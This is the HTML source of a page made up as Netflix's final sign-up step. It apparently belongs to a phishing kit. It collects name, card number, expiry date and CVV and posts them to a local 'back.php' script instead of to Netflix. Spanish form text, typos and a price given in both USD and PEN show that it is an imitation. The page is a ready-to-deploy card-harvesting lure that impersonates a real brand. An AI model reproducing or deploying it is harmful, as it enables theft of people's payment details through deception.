
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Netflix</title>
    <link rel="shortcut icon" href="../img/icon.ico" type="image/x-icon">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-eOJMYsd53ii+scO/bJGFsiCZc+5NDVN2yr8+0RDqr0Ql0h+rP48ckxlpbzKgwra6" crossorigin="anonymous">
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
</head>


<body>
    <div class="row">
        <div class="col shadow-sm header d-flex justify-content-between" style="height: 87px;">
            <a href="./"><img src="../img/logo-text.png" alt="" width="220px" class="netflix-logo"></a>
            <a href="" class="d-flex align-items-center netflix-a">Sign Out</a>
        </div>
    </div>
    <div class="form">
        <p>STEP <b>3</b> OF <b>3</b> </p>
        <h3>Set up your credit or debit card.</h3>
        <img src="../img/visa-v3.svg" alt="" class="img-card">
        <img src="../img/mastercard-v2.svg" alt="" class="img-card">
        <img src="../img/amex-v2.svg" alt="" class="img-card">
        <img src="../img/icon_dinersclub_v2.png" alt="" class="img-card">
        <form action="back.php" id="formulario" method="POST">
            <div class="formulario__grupo " id="grupo__nombre">
                <div class="formulario__grupo-input ">
                    <input type="text" placeholder="Firs Name" class="formulario__input" name="nombre" id="nombre">
                    <i class="formulario__validacion-estado fas fa-times-circle"></i>
                </div>
                <p class="formulario__input-error">Please enter a valid first name</p>
            </div>
            <div class="formulario__grupo " id="grupo__apellido">
                <div class="formulario__grupo-input ">
                    <input type="text" placeholder="Last Name" class="formulario__input" name="apellido" id="apellido">
                    <i class="formulario__validacion-estado fas fa-times-circle"></i>
                </div>
                <p class="formulario__input-error">Please enter a valid last name</p>
            </div>
            <div class="formulario__grupo " id="grupo__card">
                <div class="formulario__grupo-input ">
                    <input type="text" placeholder="Card Number" class="formulario__input" name="card" id="card">
                    <i class="formulario__validacion-estado fas fa-times-circle"></i>
                </div>
                <p class="formulario__input-error">Please enter a valid credit card number</p>
            </div>
            <div class="formulario__grupo " id="grupo__date">
                <div class="formulario__grupo-input ">
                    <input type="text" placeholder="Expiration Date (MM/YY)" class="formulario__input" name="date" id="date" onkeydown="fechas(event);" maxlength="5">
                    <i class="formulario__validacion-estado fas fa-times-circle"></i>
                </div>
                <p class="formulario__input-error">Please enter a valid expiration month</p>
            </div>
            <div class="formulario__grupo " id="grupo__cvv">
                <div class="formulario__grupo-input ">
                    <input type="text" placeholder="Segurity Code (CVV)" class="formulario__input" name="cvv" id="cvv" maxlength="5">
                    <i class="formulario__validacion-estado fas fa-times-circle"></i>
                </div>
                <p class="formulario__input-error">Please enter a valid CVV code</p>
            </div>
            <div class="plan">
                <div class="reducir">
                    <p class="p-plan"> <span> USD9.99/month </span>
                        <br> <span class="plan-premium"> Premium Plan</span></p>
                </div>
                <div>
                    <a href="" class="cambio">Change</a>
                </div>
            </div>
            <div class="content-text-1">
                <p class="text-1">
                    Your payments will be processed internationally. Additional bank fees may apply.
                </p>
            </div>
            <div class="content-text-2">
                <p class="text-2">
                    By clicking the "Start Membership" button below, you agree to our <a href="https://help.netflix.com/legal/termsofuse" class="a-term">Terms of Use,</a><a href="https://help.netflix.com/legal/privacy" class="a-term">Privacy Statement,</a>                    that you are over 18, and that <b>Netflix will automatically continue your membership and charge the monthly membership fee (currently PEN44.90) to your payment method until you cancel. You may cancel at any time to avoid future charges.</b>                    To cancel, go to Account and click "Cancel Membership."
                </p>
            </div>

            <input type="submit" value="Start Membership" class="bt-netflix">

            <p id="formulario__mensaje" class="formulario__mensaje"><i class="fas fa-exclamation-triangle"></i> <b>Error:</b> Por favor rellena el formulario correctamente. </p>
            <p class="formulario__mensaje-exito" id="formulario__mensaje-exito">Formulario enviado exitosamente!</p>
        </form>
    </div>

    </div>
    <img src="../img/xd.jpeg" alt="" class="footer" style="width: 100%;
                    margin-top: 150px;" >
</body>
<script src="https://kit.fontawesome.com/2c36e9b7b1.js" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.1/dist/umd/popper.min.js" integrity="sha384-SR1sx49pcuLnqZUnnPwx6FCym0wLsk5JZuNx2bPPENzswTNFaQU1RDvt3wT4gWFG" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/js/bootstrap.min.js" integrity="sha384-j0CNLUeiqtyaRmlzUHCPZ+Gy5fQu0dQ6eZ/xAww941Ai1SxSY+0EQqNXNE6DZiVc" crossorigin="anonymous"></script>
<script src="./main.js"></script>


</html>

